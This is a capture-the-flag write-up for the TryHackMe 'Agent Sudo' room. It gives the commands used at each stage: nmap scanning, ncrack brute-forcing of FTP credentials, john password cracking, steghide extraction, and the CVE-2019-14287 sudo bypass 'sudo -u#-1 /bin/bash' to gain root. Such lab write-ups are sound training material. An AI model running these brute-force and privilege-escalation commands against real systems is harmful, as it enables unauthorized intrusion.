---
title: Agent Sudo - Easy THM
date: 2023-11-11 10:20:51 +/-0800
categories: [writeup, tryhackme]
writeup: :title
permalink: /agentsudo
tags: [thm, writeup, easy, linux, steganographie, web, CVE-2019-14287]     # TAG names should always be lowercase
---

## **`SCANNING`**

**Threader3000 scan:**

`python3 threader3000.py 10.10.49.159`

```python
Port 21 is open
Port 22 is open
Port 80 is open
```

**nmap scan:**

`nmap -p21,22,80 -sV -sC -T4 -Pn -oA 10.10.49.159 10.10.49.159`

```python
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## `ENUMERATION`

We go on the webserver

`http://10.10.10.10/`

We spawn on a website, with a message talking about **USER-AGENT**

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)


Try changing the USER-AGENT

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

I got this new message

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)


It work, let's use the burp intruder to brute force all pages

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Found the path /C

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

User chris ? Let's try to brute force is FTP creds

```ncrack -u 'chris' -P /usr/share/wordlists/rockyou.txt ftp://10.10.118.96```

Get the FTP credentials

### FTP ENUMERATION

Retrieve all files and folder:

`wget -m --no-passive ftp://chris:pass@<target>`

Get this files
![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Extract the zip

`binwalk -e cutie.png`

Get a hash possibly

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Look like base64

`echo 'QXJlYTUx' | base64 -d`

Next, we get a zip, we use zip2john

`zip2john 8702.zip > hash.txt`

decrypt the hash with john

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Next extract the jpg with the pass

`steghide extract -sf cute-alien.jpg`

Found a user and a pass, try to connect via ssh, it work !

## `PRIVESC`

We have the user.txt, let's search for the root

check sudo rights

`sudo -l`

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Found a CVE on sudo version 1.8.27

https://www.exploit-db.com/exploits/47502

**The exploit:**

sudo -u#-1 /bin/bash

Got root !